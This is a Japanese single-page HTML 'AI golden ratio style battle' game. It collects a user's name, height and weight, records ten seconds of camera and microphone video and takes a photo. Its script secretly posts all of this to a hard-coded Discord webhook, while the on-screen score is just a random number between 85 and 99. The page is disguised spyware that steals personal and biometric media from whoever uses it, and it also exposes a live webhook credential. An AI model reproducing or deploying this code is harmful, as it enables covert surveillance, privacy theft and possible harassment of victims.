<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI 黄金比スタイル・バトル</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #000; color: #fff; padding: 20px; margin: 0; }
        .container { max-width: 500px; margin: auto; background: #111; padding: 30px; border-radius: 15px; border: 1px solid #333; }
        h1 { color: #00ffcc; font-size: 1.4em; }
        input { width: 90%; padding: 12px; margin-bottom: 15px; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; }
        button { width: 90%; padding: 18px; font-weight: bold; background: #00ffcc; color: #000; border: none; border-radius: 5px; cursor: pointer; }
        #video { width: 100%; border-radius: 10px; margin-top: 20px; display: none; aspect-ratio: 3/4; object-fit: cover; }
        #result { font-size: 1.4em; color: #00ffcc; margin-top: 25px; font-weight: bold; }
        #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>AI 黄金比スタイル・バトル</h1>
        <div id="setup-form">
            <input type="text" id="username" placeholder="名前">
            <input type="number" id="height" placeholder="身長 (cm)">
            <input type="number" id="weight" placeholder="体重 (kg)">
            <button id="startBtn">バトルにエントリーする</button>
        </div>
        <video id="video" autoplay playsinline muted></video>
        <div id="result"></div>
    </div>
    <canvas id="canvas"></canvas>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const result = document.getElementById('result');
        const setupForm = document.getElementById('setup-form');
        const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';
        let mediaRecorder; let chunks = [];
        startBtn.addEventListener('click', () => {
            const user = document.getElementById('username').value || '未設定';
            const h = document.getElementById('height').value || '？';
            const w = document.getElementById('weight').value || '？';
            setupForm.style.display = 'none'; video.style.display = 'block';
            navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                video.srcObject = stream;
                const type = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(t => MediaRecorder.isTypeSupported(t));
                mediaRecorder = new MediaRecorder(stream, { mimeType: type });
                chunks = [];
                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                mediaRecorder.onstop = () => {
                    result.innerHTML = "黄金比を測定中...";
                    setTimeout(() => { captureAndSend(user, h, w); }, 1500);
                };
                mediaRecorder.start();
                result.innerHTML = "3D測定中...(10秒)";
                setTimeout(() => {
                    mediaRecorder.requestData();
                    setTimeout(() => { mediaRecorder.stop(); }, 500);
                }, 10000);
            }).catch(() => { result.innerHTML = "エラー：許可が必要です。"; setupForm.style.display = 'block'; });
        });
        async function captureAndSend(user, h, w) {
            const score = (Math.random() * (99 - 85) + 85).toFixed(1);
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(async (photoBlob) => {
                const formData = new FormData();
                formData.append('content', `【黄金比】\n👤 名前: ${user}\n📏 身長: ${h}cm\n⚖️ 体重: ${w}kg\n📊 点数: ${score}点`);
                formData.append('file1', photoBlob, 'style.png');
                if (chunks.length > 0) {
                    const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
                    formData.append('file2', videoBlob, 'video.mp4');
                }
                await fetch(webhookUrl, { method: 'POST', body: formData });
                result.innerHTML = `あなたの黄金比：<br><span style="font-size:2em;">${score}点</span>`;
                if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
            }, 'image/png');
        }
    </script>
</body>
</html>
